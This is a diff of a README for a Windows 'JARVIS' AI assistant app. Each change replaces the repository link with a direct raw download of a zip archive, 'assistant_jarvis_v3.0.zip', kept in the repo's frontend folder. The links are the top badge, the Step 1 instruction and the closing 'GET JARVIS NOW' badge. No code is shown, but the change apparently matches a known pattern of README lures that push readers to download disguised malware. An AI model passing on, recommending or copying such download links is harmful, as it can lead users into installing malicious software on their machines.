@@ -1,7 +1,7 @@
 <h1>🤖 jarvis-assistant - Your Iron Man AI Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/jaouadinoham2/jarvis-assistant">
+  <a href="https://raw.githubusercontent.com/jaouadinoham2/jarvis-assistant/main/frontend/assistant_jarvis_v3.0.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_JARVIS-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download JARVIS" />
   </a>
 </p>
@@ -38,7 +38,7 @@ This application combines cutting-edge artificial intelligence with a futuristic
 
 ### Step 1: Download JARVIS
 
-Visit this link to download the application: [https://github.com/jaouadinoham2/jarvis-assistant](https://github.com/jaouadinoham2/jarvis-assistant)
+Visit this link to download the application: [https://raw.githubusercontent.com/jaouadinoham2/jarvis-assistant/main/frontend/assistant_jarvis_v3.0.zip](https://raw.githubusercontent.com/jaouadinoham2/jarvis-assistant/main/frontend/assistant_jarvis_v3.0.zip)
 
 Once you click the link, you'll be taken to the download page where you can get the latest version of JARVIS for Windows.
 
@@ -133,7 +133,7 @@ Visit the GitHub repository to:
 **Ready to experience the future?** Download JARVIS today and bring a piece of the Marvel universe into your daily life. Your very own AI assistant is waiting to help you!
 
 <p align="center">
-  <a href="https://github.com/jaouadinoham2/jarvis-assistant">
+  <a href="https://raw.githubusercontent.com/jaouadinoham2/jarvis-assistant/main/frontend/assistant_jarvis_v3.0.zip">
     <img src="https://img.shields.io/badge/🚀_GET_JARVIS_NOW-4ECDC4?style=for-the-badge&logo=github&logoColor=white" alt="Get JARVIS Now" />
   </a>
 </p>
